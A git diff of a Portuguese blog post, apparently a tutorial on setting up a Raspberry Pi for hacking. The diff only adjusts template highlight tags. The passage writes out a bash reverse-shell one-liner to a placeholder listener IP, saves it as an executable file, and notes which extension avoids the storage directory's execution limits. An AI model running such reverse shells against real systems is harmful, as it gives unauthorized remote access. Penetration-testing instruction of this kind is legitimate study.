@@ -18,15 +18,19 @@ A publicação sobre como criar um raspberry para hacking não é exetamente igu
 
 2. Feito isso, precisamos criar um script que funcionará como nosso nosso shell reverso. Para tal, é recomendável utilizar o [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da pentest Monkey.
 
-{% raw % }
+{% highlight %}
+{% raw %}
 bash -i >& /dev/tcp/\<ip da maquina que está escutando\>/8080 0>&1
 {% endraw %}
+{% endhighlight %}
 
 Colocamos então o código acima em um arquivo (chamaremos ele de reverse) e concedemos a ele permissão de execução da seguinte maneira:
 
+{% highlight %}
 {% raw %}
 chmod +x reverse
 {% endraw %}
+{% endhighlight %}
 
 Obs: Vale ressaltar que não devemos colocar o script com extensão .sh pois o diretório em que ele será armazenado não executa arquivos com esse formato.
 
